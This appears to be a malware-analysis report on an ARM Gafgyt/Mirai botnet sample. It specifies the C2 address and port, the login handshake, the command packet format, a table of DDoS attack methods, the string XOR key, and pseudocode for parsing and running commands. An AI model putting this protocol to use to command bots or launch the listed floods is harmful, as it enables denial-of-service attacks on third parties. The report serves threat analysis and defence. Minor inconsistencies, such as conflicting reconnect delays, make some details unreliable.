# Gafgyt/Mirai Botnet - Communication Layer Specification

## Binary Information
- **Architecture:** ARM 32-bit LE (v8)
- **Format:** ELF
- **Analysis Target:** C2 Communication Layer (Session Establishment & Command Processing)

---

## 1. Session Establishment

### 1.1 Observed Behavior

The malware establishes a TCP connection to a hardcoded C2 server, then performs a multi-part authentication handshake. The handshake consists of:

1. **TCP Connect** — The bot creates a non-blocking TCP socket and connects to the C2 server
2. **Wait for Connection** — The bot enters a `select()`-based event loop waiting for the socket to become writable (connection established)
3. **Login Burst** — Upon connection (or reconnection after a closed session), the bot transmits:
   - A 16-byte block containing metadata (local IP + password length header)
   - A 1-byte field encoding the password length
   - The password string itself (if length > 0)
4. **Command Reception** — After authentication, the bot enters a receive loop waiting for command packets

### 1.2 C2 Server Address

The C2 server address is computed at runtime using bitwise NOT and subtraction operations to obfuscate the constants:

```
IP   = ~0x23800000 - 0x8F00 - 0xA3  = 0xDC7F705C
Port = ~0x5A0 - 0xD                 = 0xFA52
```

**Network-byte-order interpretation (sockaddr_in):**

| Field    | Computed Value | Wire Format    | Resolved Value     |
|----------|---------------|----------------|--------------------|
| IP       | 0xDC7F705C    | 5C 70 7F DC    | 92.112.127.220     |
| Port     | 0xFA52        | 52 FA          | 21242              |
| Family   | 2             | 00 02          | AF_INET            |

**Connection parameters:**
- Protocol: TCP (SOCK_STREAM)
- Socket: Non-blocking (`O_NONBLOCK` flag set via `fcntl(F_SETFL)`)
- Timeout: `select()` with 10-second timeout

### 1.3 Handshake Logic (Pseudocode)

```
// Phase 1: Connection
function establish_session():
    sockfd = socket(AF_INET, SOCK_STREAM, 0)
    if sockfd == -1: return ERROR
    
    addr.sin_family = AF_INET
    addr.sin_port   = 0xFA52        // Port 21242
    addr.sin_addr   = 0xDC7F705C    // IP 92.112.127.220
    
    // Set non-blocking
    flags = fcntl(sockfd, F_GETFL, 0)
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK)
    
    connect(sockfd, &addr, sizeof(addr))
    // connect() returns immediately due to non-blocking mode
    // Connection completion is detected via select() writable event
    
    return sockfd

// Phase 2: Login (sent when connection is established or re-established)
function send_login(sockfd, password):
    password_len = strlen(password)
    local_ip = get_local_ip()  // via UDP connect to 8.8.8.8:13568
    
    // Part 1: 16-byte metadata block
    // Contains: local_ip (4 bytes) + padding + header info
    send(sockfd, login_metadata_block, 16, 0)
    
    // Part 2: Password length byte
    send(sockfd, &password_len, 1, 0)
    
    // Part 3: Password string (if non-empty)
    if password_len > 0:
        send(sockfd, password, password_len, 0)
```

### 1.4 Login Packet Format

The login transmission is a three-part message sent sequentially on the same TCP stream:

```
PART 1: 16-byte Metadata Block
Offset  Size  Description
0       4     Local IP address (uint32, network byte order)
4       12    Reserved / zero-padded

PART 2: Password Length
Offset  Size  Description
0       1     Length of password string (uint8)

PART 3: Password Data (conditional)
Offset  Size  Description
0       N     Password string (N = length from Part 2, raw bytes, no null terminator)
              Only sent if length > 0
```

### 1.5 Credentials

**Password source:** The bot accepts a password as its first command-line argument (`argv[1]`).

```c
if (argc == 2 && strlen(argv[1]) < 0x20) {
    strcpy(password_buf, argv[1]);
    memset(argv[1], 0, strlen(argv[1]));  // Wipe from argv for security
} else {
    strcpy(password_buf, DEFAULT_PASSWORD);
}
```

**Default password:** `"unknown"` (plaintext string at address `0x00016ee8`)

**Note:** The default password `"unknown"` is a fallback. In operational deployments, the launcher script provides the actual C2 password as `argv[1]`.

### 1.6 Fingerprinting Behavior

During the login handshake, the bot transmits its **local IP address** as part of the 16-byte metadata block. This is obtained by:

1. Creating a UDP socket
2. Connecting it to `8.8.8.8:13568` (a non-routable UDP "connect" to force the kernel to select a local interface)
3. Calling `getsockname()` to retrieve the local IP address assigned by the kernel

This allows the C2 server to learn the bot's IP address even if it connects through NAT.

### 1.7 Server Response / Session Acceptance

**Verified Fact:** The C2 server does NOT send any explicit authentication response or session token. After the login burst, the bot immediately enters the command receive loop.

**Session acceptance criteria:** The bot considers the session established when:
- The TCP connection is successfully established (socket becomes writable in `select()`)
- The login burst has been transmitted
- The socket becomes readable (indicating data from the server)

**Failure handling:** If the connection fails or is closed by the server:
1. `recvfrom()` returns 0 (connection closed)
2. The bot attempts to re-send the login burst on the existing socket
3. The socket is closed and set to -1
4. After a 1-second sleep, the bot creates a new socket and reconnects

### 1.8 Analysis Gap: Server Validation

**Unknown:** The exact server-side validation logic cannot be determined from the client binary alone. The bot does not check for any specific response from the server after sending credentials. The server may:
- Silently drop the connection if the password is invalid
- Send a command packet only after successful validation
- Use the password for session binding/tracking without explicit acknowledgment

---

## 2. Cryptography

### 2.1 Observed Behavior

**No encryption is applied to C2 traffic.** All network communication between the bot and C2 server is transmitted in plaintext over TCP. There is no:
- XOR obfuscation of command packets
- Encryption (AES, RC4, or other)
- Base64 or other encoding
- Cryptographic handshake or key exchange

The only obfuscation in the binary is the **string table XOR** used to hide hardcoded strings (file paths, process names, etc.) from static analysis. This obfuscation is applied to strings stored in the binary's read-only data section, NOT to network traffic.

### 2.2 String Table Obfuscation (Not Network Crypto)

For completeness, the string obfuscation mechanism is documented here:

**Algorithm:** Multi-pass bytewise XOR

```c
uint32_t xor_key = 0xDEADBEEF;  // Stored at 0x0001809c

void table_unlock_val(int table_index) {
    entry = table_base + table_index * 8;
    data_ptr = *(uint32_t *)(entry + 0);     // Pointer to string data
    data_len = *(uint16_t *)(entry + 4);     // String length
    
    for (i = 0; i < data_len; i++) {
        data_ptr[i] ^= (xor_key & 0xFF);         // XOR with 0xEF
        data_ptr[i] ^= ((xor_key >> 8) & 0xFF);  // XOR with 0xBE
        data_ptr[i] ^= ((xor_key >> 16) & 0xFF); // XOR with 0xAD
        data_ptr[i] ^= ((xor_key >> 24) & 0xFF); // XOR with 0xDE
    }
}
```

**Effective XOR value:** Due to the commutative property of XOR, the four sequential XOR operations are equivalent to a single XOR with the combined value:

```
effective_key = 0xEF ^ 0xBE ^ 0xAD ^ 0xDE = 0x22
```

Therefore, `table_unlock_val` is functionally equivalent to XORing each byte with `0x22`.

**Usage:** `table_lock_val()` applies the same XOR (re-encrypts), while `table_unlock_val()` decrypts. These functions are called before and after accessing obfuscated strings, respectively.

### 2.3 Decryption Routine (Pseudocode)

```
// Decrypt an obfuscated string from the table
function decrypt_table_string(index):
    entry_ptr = TABLE_BASE + index * 8
    
    // Each table entry is 8 bytes:
    //   [0-3]: pointer to string data (uint32)
    //   [4-5]: string length (uint16)
    //   [6-7]: flags (uint16)
    
    str_ptr = *(uint32_t *)(entry_ptr + 0)
    str_len = *(uint16_t *)(entry_ptr + 4)
    
    if str_len == 0:
        return ""
    
    for i = 0 to str_len - 1:
        str_ptr[i] ^= 0x22
    
    return str_ptr  // Now points to decrypted null-terminated string
```

### 2.4 Analysis Gap

**Verified Fact:** There is no encryption on the C2 channel. The command packets are transmitted and processed in plaintext. This is confirmed by:
1. Direct inspection of the receive path in `main()` — data read from socket is passed directly to `attack_parse_packet()` without any decryption step
2. No cryptographic function calls (no AES, RC4, or custom decryption routines) in the command processing path

---

## 3. Main Command Loop

### 3.1 Observed Behavior

After session establishment, the bot enters a `select()`-based event loop that handles:
1. **Incoming commands** from the C2 server
2. **Heartbeat/keepalive** pings
3. **Control socket events** (local single-instance controller)
4. **Killer timer** (periodic check every 12th heartbeat cycle)

The command processing flow is:

```
[select() event loop]
    |
    +-- Timeout (10s) --> Increment heartbeat counter
    |                        If counter % 6 == 0: send 2-byte keepalive
    |
    +-- Server socket readable --> Read 2-byte length prefix
    |                                Read N-byte payload
    |                                Parse command packet
    |                                Dispatch to attack handler
    |
    +-- Server socket writable --> Connection established (post-connect)
    |                                Set connected flag
    |
    +-- Control socket readable --> Kill all processes and exit
```

### 3.2 Protocol Specification

#### 3.2.1 Framing

Commands are framed with a **2-byte length prefix** (uint16, big-endian):

```
[2-byte length][N-byte payload]
```

- **Length field:** 2 bytes, big-endian, unsigned. Value = number of payload bytes following.
- **Maximum payload size:** 1024 bytes (0x400). If the decoded length exceeds this, the socket is closed and the connection is reset.
- **Zero-length payload:** A length of 0 is a valid no-op (the packet is discarded).

#### 3.2.2 Command Payload Format

```
Offset  Size  Field            Description
0       4     Command ID       uint32, big-endian. 0 = KILL, non-zero = attack command
4       1     Method ID        uint8. Attack method identifier (see section 3.2.4)
5       1     Target Count     uint8. Number of target entries (N)
6       N*5   Targets          N target entries, each 5 bytes (see 3.2.5)
6+N*5   var   Options          Variable-length options section (see 3.2.6)
```

#### 3.2.3 Command ID (First 4 bytes)

The first 4 bytes are interpreted as a big-endian uint32 and byte-swapped to little-endian:

```c
command_id = (bytes[0] << 24) | (bytes[1] << 16) | (bytes[2] << 8) | bytes[3];
// Equivalent to ntohl(*(uint32_t *)packet)
```

**Special value:**
- `0x00000000` = **KILL command**. Terminates ALL currently running attack processes and resets the attack slot table.

**Non-zero values:** Treated as a duration parameter (attack time in seconds). Passed to `attack_start()` as the first argument.

#### 3.2.4 Attack Method ID (Byte 4)

The attack method ID selects which DDoS function to execute. The mapping is:

| ID | Function Name     | Address    | Technique              |
|----|-------------------|------------|------------------------|
| 1  | attack_method_std | 0x00009160 | Standard UDP flood     |
| 2  | attack_udp_std_alt| 0x0000b978 | Alternative UDP flood  |
| 3  | attack_udp_plain  | 0x00008e74 | UDP plain flood        |
| 4  | attack_tcp_ack    | 0x0000b1ec | TCP ACK flood          |
| 5  | attack_tcp_raw    | 0x0000a1d0 | TCP raw socket flood   |
| 6  | attack_tcp_syn_custom| 0x0000aa38 | TCP SYN custom flood |
| 7  | attack_gre_flood  | 0x00009844 | GRE flood              |
| 8  | attack_tcp_stomp  | 0x00009e74 | TCP stomp              |
| 9  | attack_self_replicate| 0x00008190 | Self-replication     |
| 10 | attack_method_raw | 0x0000944c | Raw IP socket flood    |

#### 3.2.5 Target Entry Format (Each 5 bytes)

```
Offset  Size  Field    Description
0       4     IP       Target IP address (uint32, network byte order)
4       1     CIDR     CIDR prefix length (uint8). Typically 32 for single host.
```

Each target entry is parsed and stored in a `struct target`:
```c
struct target {
    uint32_t ip;       // Target IP address
    uint8_t  cidr;     // CIDR prefix length (bitmask width)
    // Padding to 24 bytes per allocation
};
```

#### 3.2.6 Options Section Format

The options section follows the targets and encodes configurable parameters for the attack:

```
Offset  Size  Field            Description
0       1     Option Count     uint8. Number of option entries (M)
1       1     Option ID[0]     uint8. Identifier for first option
2       1     Value Len[0]     uint8. Length of first option value
3       V[0]  Value[0]        Option value (V[0] bytes)
3+V[0]  1     Option ID[1]     uint8. Identifier for second option
...     ...   ...             ...
```

Each option entry is parsed and stored in a `struct option`:
```c
struct option {
    char *val;    // Pointer to option value string (dynamically allocated)
    char  id;     // Option flag ID (uint8)
};
// Total per entry: 8 bytes (pointer + id + padding)
```

**Option IDs** are attack-specific flags that control behavior such as:
- Source port
- Packet payload content
- Packet length/size
- Flag bits (for TCP attacks)
- Interval/delay between packets

**Note:** The exact semantics of each option ID are attack-function-specific and determined by the individual attack handler's parsing of the options array.

### 3.3 Message Processing Logic (Pseudocode)

```
function main_event_loop():
    heartbeat_counter = 0
    server_fd = -1
    connected = 0
    
    while true:
        // Reset fd_sets
        FD_ZERO(&read_fds)
        FD_ZERO(&write_fds)
        
        // Add control socket to read set
        if ctrl_fd != -1:
            FD_SET(ctrl_fd, &read_fds)
        
        // Handle server connection
        if server_fd == -1:
            // Create new connection
            server_fd = socket(AF_INET, SOCK_STREAM, 0)
            if server_fd != -1:
                setup_sockaddr_in(&addr, C2_IP, C2_PORT)
                fcntl(server_fd, F_SETFL, O_NONBLOCK)
                connect(server_fd, &addr, sizeof(addr))
                connected = 1  // Wait for writable
        else:
            if connected:
                FD_SET(server_fd, &write_fds)  // Wait for connection completion
            else:
                FD_SET(server_fd, &read_fds)   // Wait for incoming data
        
        // Wait for events (10-second timeout)
        timeout.tv_sec = 10
        result = select(max_fd + 1, &read_fds, &write_fds, NULL, &timeout)
        
        if result == -1:
            continue  // Error, restart loop
        
        if result == 0:
            // Timeout - heartbeat
            heartbeat_counter++
            if heartbeat_counter % 6 == 0:
                send_heartbeat(server_fd)
            continue
        
        // Check control socket
        if ctrl_fd is in read_fds:
            handle_control_command(ctrl_fd)
        
        // Check server socket
        if server_fd in write_fds and connected:
            // Connection established
            connected = 0
            continue
        
        if server_fd in read_fds and not connected:
            // Data available - read command
            process_server_data(server_fd)
        
        // Periodic killer check (every 12th iteration)
        if heartbeat_counter % 12 == 0:
            killer_check_timer()


function process_server_data(sockfd):
    // Step 1: Read 2-byte length prefix
    len_buf = read_exact(sockfd, 2)
    if len_buf == ERROR:
        handle_disconnect(sockfd)
        return
    
    payload_length = big_endian_to_uint16(len_buf)
    
    // Validate length
    if payload_length == 0:
        return  // No-op
    
    if payload_length > 1024:
        close(sockfd)
        return  // Invalid, too large
    
    // Step 2: Read payload
    payload = read_exact(sockfd, payload_length)
    if payload == ERROR:
        handle_disconnect(sockfd)
        return
    
    // Step 3: Parse and execute command
    parse_and_execute(payload, payload_length)


function parse_and_execute(payload, length):
    if length <= 3:
        return  // Too short
    
    // Byte-swap first 4 bytes (big-endian to little-endian)
    command_id = ntohl(*(uint32_t *)payload)
    
    if command_id == 0:
        // KILL command - terminate all attacks
        for each attack_slot:
            if slot_pid != 0:
                kill_neg(slot_pid, SIGKILL)
                kill(-slot_pid, SIGKILL)
                kill(slot_pid, SIGKILL)
                slot_pid = 0
        return
    
    if length <= 5:
        return  // Need at least method_id + target_count
    
    method_id = payload[4]
    target_count = payload[5]
    
    if target_count == 0:
        return  // No targets specified
    
    remaining = length - 6
    targets_size = target_count * 5
    
    if remaining < targets_size:
        return  // Not enough data for targets
    
    // Parse targets
    targets = alloc(target_count * sizeof(struct target))
    for i = 0 to target_count - 1:
        offset = 6 + i * 5
        targets[i].ip   = *(uint32_t *)(payload + offset)
        targets[i].cidr = payload[offset + 4]
    
    // Parse options (if any)
    options = NULL
    option_count = 0
    options_remaining = remaining - targets_size
    
    if options_remaining > 0:
        opt_offset = 6 + targets_size
        option_count = payload[opt_offset]
        
        if option_count > 0 and options_remaining >= 1 + option_count * 2:
            options = alloc(option_count * sizeof(struct option))
            opt_offset++  // Skip option count byte
            
            for i = 0 to option_count - 1:
                if options_remaining < 2:
                    break
                opt_id = payload[opt_offset]
                val_len = payload[opt_offset + 1]
                opt_offset += 2
                
                if val_len > options_remaining - 2:
                    break
                
                options[i].id = opt_id
                options[i].val = alloc(val_len + 1)
                memcpy(options[i].val, payload + opt_offset, val_len)
                options[i].val[val_len] = '\0'
                opt_offset += val_len
                options_remaining -= (2 + val_len)
    
    // Execute attack
    attack_start(command_id, method_id, target_count, targets, 
                 option_count, options)
    
    // Cleanup
    if targets:
        free(targets)
    if options:
        for i = 0 to option_count - 1:
            if options[i].val:
                free(options[i].val)
        free(options)


function handle_disconnect(sockfd):
    // Connection closed by server
    errno = 0
    send_login(sockfd, password)  // Attempt re-login
    
    close(sockfd)
    server_fd = -1
    sleep(1)
```

### 3.4 Dynamic Command Registration

**Verified Fact:** The attack method dispatch table is populated at startup by `attack_init()`. This function dynamically allocates and registers attack handlers into a dispatch table. The registration is **static** (hardcoded at compile time) — there is no mechanism for the C2 server to register new attack methods at runtime.

The dispatch mechanism works as follows:
1. `attack_init()` is called once at startup
2. It allocates an array of `{function_pointer, method_id}` pairs
3. Each pair maps a method ID to its handler function
4. At dispatch time, `attack_start()` iterates through the table to find the matching method ID

### 3.5 Attack Execution Model

```
function attack_start(duration_seconds, method_id, target_count, targets, 
                      option_count, options):
    // Fork supervisor process
    supervisor_pid = fork()
    
    if supervisor_pid > 0:
        // Parent (daemon): track PID in slot table
        store_in_slot(supervisor_pid)
        return
    
    if supervisor_pid == -1:
        return  // Fork failed
    
    // --- Child (supervisor process) ---
    setpgid(0, 0)  // New process group
    
    // Fork timer grandchild
    timer_pid = fork()
    
    if timer_pid == 0:
        // --- Grandchild (timer process) ---
        sleep(duration_seconds)
        kill(getppid(), SIGKILL)  // Kill supervisor when time expires
        exit(0)
    
    // --- Supervisor continues ---
    // Look up attack function by method_id
    handler = find_attack_handler(method_id)
    
    if handler:
        handler(target_count, targets, option_count, options)
    
    // Handler runs indefinitely (until killed by timer)
    exit(0)
```

---

## 4. ACKs & Keepalives

### 4.1 Observed Behavior

The bot maintains the C2 session through two feedback mechanisms:

1. **Heartbeat/Ping:** A 2-byte zero payload sent every ~60 seconds (6 select cycles × 10-second timeout)
2. **Command Responses:** No explicit ACK or response is sent after command execution. The bot does not report execution status, results, or errors back to the C2 server.

### 4.2 Heartbeat/Ping Format

```
[0x00, 0x00]  // 2 bytes: zero uint16
```

**Transmission mechanism:** The heartbeat is sent using `sendmsg()` (or equivalent) with the `MSG_NOSIGNAL` flag (0x4000).

**Interval calculation:**
```c
heartbeat_counter++;  // Incremented every select() timeout (10 seconds)
if (heartbeat_counter % 6 == 0) {  // Every 60 seconds
    uint16_t ping = 0x0000;
    send(server_fd, &ping, 2, MSG_NOSIGNAL);
}
```

**Timeout behavior:** The `select()` call uses a 10-second timeout. If no data is received from the server within this window, the heartbeat counter increments. If the `select()` call returns an error (not timeout), the loop restarts.

### 4.3 Reconnection Behavior

When the server closes the connection or a network error occurs:

1. `recvfrom()` returns 0 (graceful close) or -1 (error)
2. If errno is EAGAIN (4) or EWOULDBLOCK (11): retry the read
3. Otherwise: close the socket, set `server_fd = -1`, sleep 1 second, then reconnect

**Reconnect delay:** A random sleep between 1-10 seconds is applied before reconnecting, calculated as:
```c
sleep(1 + (rand() % 10));
```

### 4.4 Status Reporting

**Verified Fact:** The bot does NOT send any of the following to the C2:
- Execution success/failure ACKs
- Attack completion reports
- Victim/target telemetry
- Error reports
- System information (beyond the local IP sent during login)

### 4.5 Session Lifecycle

```
State Diagram:
                    +-----------+
                    |   START   |
                    +-----------+
                          |
                          v
              +---------------------+
              | TCP CONNECT (non-blocking)
              +---------------------+
                    |          |
                    | success  | failure
                    v          v
              +--------+   +----------+
              | LOGIN  |   | SLEEP 1s |
              | burst  |   +----------+
              +--------+         |
                    |            v
                    v          (retry)
              +-----------+
              | COMMAND   |<----+
              | LOOP      |     |
              | (select)  |     |
              +-----------+     |
                    |           |
        +-----------+-----------+------+
        |           |                  |
        v           v                  v
   +---------+ +---------+      +-----------+
   |CMD RECV | |TIMEOUT  |      |DISCONNECT |
   |+execute | |+ping    |      |+reconnect |
   +---------+ |every 60s|      +-----------+
               +---------+
```

**Graceful termination:** When the control socket receives a connection (single-instance bind), the bot:
1. Calls `killer_cleanup()`
2. Kills all tracked attack PIDs with `SIGKILL`
3. Kills the entire process group with `SIGKILL`
4. Exits with `exit_group(0)`

### 4.6 Feedback Logic (Pseudocode)

```
// No explicit ACK/response sent after command execution
// The only periodic transmission is the heartbeat

function send_heartbeat(sockfd):
    uint16_t ping = 0x0000
    result = send(sockfd, &ping, 2, MSG_NOSIGNAL)
    
    if result == -1:
        if errno != EAGAIN and errno != EWOULDBLOCK:
            // Socket error - will be handled in main loop
            close(sockfd)
            server_fd = -1
            sleep(1)
```

---

## 5. Summary of Protocol Constants

| Constant | Value | Description |
|----------|-------|-------------|
| C2 IP | 92.112.127.220 | Hardcoded C2 server address |
| C2 Port | 21242 | Hardcoded C2 server port |
| Single-instance port | 51101 | Local binding port (0xC79D) |
| Default password | "unknown" | Fallback if no argv[1] |
| XOR key | 0xDEADBEEF | String table obfuscation key |
| Effective XOR | 0x22 | Per-byte XOR value (0xEF^0xBE^0xAD^0xDE) |
| Select timeout | 10 seconds | `select()` timeout interval |
| Heartbeat interval | 60 seconds | Every 6th select timeout |
| Heartbeat payload | `\x00\x00` | 2-byte zero keepalive |
| Max payload size | 1024 bytes | Maximum command payload length |
| Password max len | 31 bytes | Maximum password length (0x20 - 1) |
| Attack slot count | 8 | Maximum concurrent attack processes |

## 6. Analysis Gaps

| Gap | Reason | Impact |
|-----|--------|--------|
| Server-side validation logic | Not present in client binary | Cannot determine exact authentication requirements |
| Option ID semantics | Defined per-attack-function | Individual attack handlers not analyzed in this document |
| C2 response to invalid password | Not handled by client | Bot proceeds to command loop regardless |
| Dynamic C2 address updates | Not implemented | C2 address is hardcoded and immutable at runtime |
